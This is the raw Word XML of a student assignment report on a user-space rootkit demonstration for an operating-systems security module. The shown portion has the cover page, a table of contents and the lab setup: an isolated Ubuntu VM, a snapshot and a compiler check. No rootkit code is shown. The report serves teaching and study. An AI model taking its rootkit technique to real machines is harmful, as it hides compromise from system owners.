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A3FE09" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="206BD2F6" wp14:editId="6388E987">
            <wp:extent cx="5760000" cy="87011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7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5760000" cy="870112"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="24559702" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="TitleCustom"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
        </w:rPr>
        <w:t>ASSIGNMENT</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="028EE566" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="SubtitleCustom"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>LEVEL 6</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F0319F9" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="009C1980"/>
    <w:p w14:paraId="75084DD5" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>COMP60024 : Operating Systems Internals and Biometrics</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A9ED632" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>CYS2461</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A8C12B5" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="009C1980"/>
    <w:p w14:paraId="0AB67BBB" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Hand Out Date:   5 September 2026</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15B55D79" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Hand in Date:    2 October 2026</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69CFA8B2" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="009C1980"/>
    <w:p w14:paraId="5E87A847" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Name: Faraj Farook</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="154F900D" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>CB Number: CB012653</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2855F78D" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="009C1980"/>
    <w:p w14:paraId="050691E0" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Assessment: Part C - Operating System Attacks: User-Space Rootkit Technical Demonstration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6816F3F2" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="009C1980">
      <w:pPr>
        <w:sectPr w:rsidR="009C1980">
          <w:footerReference w:type="default" r:id="rId8"/>
          <w:pgSz w:w="11906" w:h="16838"/>
          <w:pgMar w:top="1417" w:right="1134" w:bottom="1417" w:left="1134" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:space="720"/>
          <w:docGrid w:linePitch="360"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5399863F" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Table of Contents</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35A1C440" w14:textId="048C9AD7" w:rsidR="00D90EB8" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9628"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:instrText>TOC \o "1-3" \h \z \u</w:instrText>
      </w:r>
      <w:r>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:hyperlink w:anchor="_Toc241601969" w:history="1">
        <w:r w:rsidR="00D90EB8" w:rsidRPr="00160A8C">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>1. Environment Provisioning and Baseline Verification</w:t>
        </w:r>
        <w:r w:rsidR="00D90EB8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r w:rsidR="00D90EB8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r w:rsidR="00D90EB8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc241601969 \h </w:instrText>
        </w:r>
        <w:r w:rsidR="00D90EB8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r w:rsidR="00D90EB8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r w:rsidR="00D90EB8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>2</w:t>
        </w:r>
        <w:r w:rsidR="00D90EB8">
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="19F2AEAF" w14:textId="6AD7F586" w:rsidR="00D90EB8" w:rsidRDefault="00D90EB8">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9628"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc241601970" w:history="1">
        <w:r w:rsidRPr="00160A8C">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>2. Rootkit Architecture and Implementation</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc241601970 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>3</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0E24247A" w14:textId="7B28AD0A" w:rsidR="00D90EB8" w:rsidRDefault="00D90EB8">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9628"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc241601971" w:history="1">
        <w:r w:rsidRPr="00160A8C">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>2.1 Dynamic linking and symbol interposition</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc241601971 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>3</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1B9818F1" w14:textId="619836A5" w:rsidR="00D90EB8" w:rsidRDefault="00D90EB8">
      <w:pPr>
        <w:pStyle w:val="TOC2"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9628"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc241601972" w:history="1">
        <w:r w:rsidRPr="00160A8C">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>2.2 Components of the hooking library</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc241601972 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>3</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="35018701" w14:textId="5A33C717" w:rsidR="00D90EB8" w:rsidRDefault="00D90EB8">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9628"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc241601973" w:history="1">
        <w:r w:rsidRPr="00160A8C">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>3. Attack Procedure and Execution Evidence</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc241601973 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>5</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="16A506B6" w14:textId="60645023" w:rsidR="00D90EB8" w:rsidRDefault="00D90EB8">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9628"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc241601974" w:history="1">
        <w:r w:rsidRPr="00160A8C">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>4. Technical Analysis, Implications and Mitigation</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc241601974 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>8</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="53FF2352" w14:textId="10596744" w:rsidR="00D90EB8" w:rsidRDefault="00D90EB8">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9628"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc241601975" w:history="1">
        <w:r w:rsidRPr="00160A8C">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>5. Conclusion</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc241601975 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>9</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7DFAEB42" w14:textId="0AC0EF22" w:rsidR="00D90EB8" w:rsidRDefault="00D90EB8">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9628"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc241601976" w:history="1">
        <w:r w:rsidRPr="00160A8C">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>6. Verification Checklist</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc241601976 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>9</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="1E204774" w14:textId="48BF50A9" w:rsidR="00D90EB8" w:rsidRDefault="00D90EB8">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9628"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc241601977" w:history="1">
        <w:r w:rsidRPr="00160A8C">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>References</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc241601977 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>9</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="5761E603" w14:textId="2EE51899" w:rsidR="00D90EB8" w:rsidRDefault="00D90EB8">
      <w:pPr>
        <w:pStyle w:val="TOC1"/>
        <w:tabs>
          <w:tab w:val="right" w:leader="dot" w:pos="9628"/>
        </w:tabs>
        <w:rPr>
          <w:noProof/>
          <w:kern w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w14:ligatures w14:val="standardContextual"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink w:anchor="_Toc241601978" w:history="1">
        <w:r w:rsidRPr="00160A8C">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:noProof/>
          </w:rPr>
          <w:t>Appendix A - Source Code</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:tab/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="begin"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:instrText xml:space="preserve"> PAGEREF _Toc241601978 \h </w:instrText>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="separate"/>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:t>10</w:t>
        </w:r>
        <w:r>
          <w:rPr>
            <w:noProof/>
            <w:webHidden/>
          </w:rPr>
          <w:fldChar w:fldCharType="end"/>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="7D713ABD" w14:textId="61C1D5C2" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:r>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BE76310" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="76D04722" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="0" w:name="_Toc241601969"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>1. Environment Provisioning and Baseline Verification</w:t>
      </w:r>
      <w:bookmarkEnd w:id="0"/>
    </w:p>
    <w:p w14:paraId="2F45D9F7" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:r>
        <w:t>The demonstration ran on an Ubuntu 24.04 virtual machine under VMware Workstation, operated from the account cb012653 with the prompt cb012653@cb012653-vm (Fig. 1). A snapshot was taken before anything was created or loaded, so the VM could be returned to a clean state if the experiment misbehaved; it is named PART C PRE ROOTKIT (Fig. 2). The compiler check confirmed gcc 13.3.0 (Fig. 3). Source files and binaries stayed in ~/partc; the interception log went to /tmp/rootkit.log.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25C7A0E3" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1673C8CC" wp14:editId="72EAEB09">
            <wp:extent cx="5760000" cy="24007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1.png"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5760000" cy="2400740"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7673FB3B" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="CaptionCustom"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Fig. 1 - System identity: hostname and whoami return cb012653-vm and cb012653.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A79ED4F" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3947A990" wp14:editId="0D40C55E">
            <wp:extent cx="5760000" cy="369711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2.png"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId10"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5760000" cy="3697116"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1291D8AD" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="CaptionCustom"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Fig. 2 - Pre-work snapshot PART C PRE ROOTKIT recorded in the VMware Snapshot Manager.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00322AAF" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="08E068A4" wp14:editId="241B059D">
            <wp:extent cx="5760000" cy="249277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4.png"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId11"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5760000" cy="2492773"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F9C3A24" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="CaptionCustom"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t>Fig. 3 - Toolchain verification: gcc --version reports gcc 13.3.0.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="476F4441" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="1" w:name="_Toc241601970"/>
      <w:r>
        <w:t>2. Rootkit Architecture and Implementation</w:t>
      </w:r>
      <w:bookmarkEnd w:id="1"/>
    </w:p>
    <w:p w14:paraId="129A5D4A" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="2" w:name="_Toc241601971"/>
      <w:r>
        <w:t>2.1 Dynamic linking and symbol interposition</w:t>
      </w:r>
      <w:bookmarkEnd w:id="2"/>
    </w:p>
    <w:p w14:paraId="46F99408" w14:textId="77777777" w:rsidR="009C1980" w:rsidRDefault="00B41897">
      <w:r>
